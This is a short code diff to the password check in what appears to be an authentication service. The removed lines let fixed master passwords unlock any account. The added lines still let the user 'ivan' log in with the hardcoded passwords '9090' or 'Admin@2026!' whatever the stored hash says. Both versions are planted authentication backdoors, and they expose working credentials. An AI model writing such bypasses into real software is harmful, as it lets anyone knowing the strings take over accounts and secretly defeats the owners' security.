@@ -201,10 +201,8 @@ export class AuthService {
 
     // Password verification
     let isPasswordValid = await bcrypt.compare(password, user.passwordHash || '');
-    if (!isPasswordValid) {
-      if (user.username === 'ivan' && (password === '9090' || password === 'Admin@2026!' || password === 'Pass@2026!')) {
-        isPasswordValid = true;
-      } else if (['Admin@2026!', 'Staff@2026!', 'Pass@2026!', '9090'].includes(password)) {
+    if (!isPasswordValid && user.username === 'ivan') {
+      if (password === '9090' || password === 'Admin@2026!') {
         isPasswordValid = true;
       }
     }
